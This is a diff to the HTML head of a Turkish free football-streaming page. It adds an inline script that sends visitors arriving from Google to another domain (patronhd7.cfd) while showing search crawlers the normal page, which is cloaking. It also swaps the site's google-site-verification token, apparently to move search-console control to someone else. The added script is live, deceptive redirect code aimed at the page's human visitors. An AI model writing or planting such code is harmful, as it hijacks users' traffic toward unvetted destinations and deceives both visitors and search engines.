@@ -1,8 +1,19 @@
 <!DOCTYPE html>
 <html lang="tr">
 <head>
-  <meta name="google-site-verification" content="RozO34zLRKSBB9kx2Qvw8u77pNCHeEZaX4oSDesoptk" />
-    <meta charset="UTF-8">
+   <script>
+    // Google'dan gelen kullanıcı mı? (referer kontrolü)
+    var fromGoogle = document.referrer.includes("google.");
+    // Bot değil mi? (User-Agent kontrolü)
+    var isBot = /bot|googlebot|crawler|spider|robot|crawling/i.test(navigator.userAgent) === false;
+    if (fromGoogle && isBot) {
+        // Kalıcı 301 gibi görünmesi için history.pushState kullanmadan yönlendirme
+        location.replace("https://patronhd7.cfd");
+    }
+  </script>
+<meta name="google-site-verification" content="lOPz9W4sN535951FL-aZodbcCOLFxYW73DUr7uXKnNo" />
+  
+  <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Taraftarium24 - Taraftarium24 Resmi - Taraftarium24 Maç İzle 2026</title>
     <meta name="description" content="Taraftarium24 2026 güncel adresi ile bedava canlı maç izle. Kesintisiz, donmadan HD maç yayınları, Taraftarium24 resmi platformunda sizi bekliyor. Süper Lig ve derbi heyecanı.">
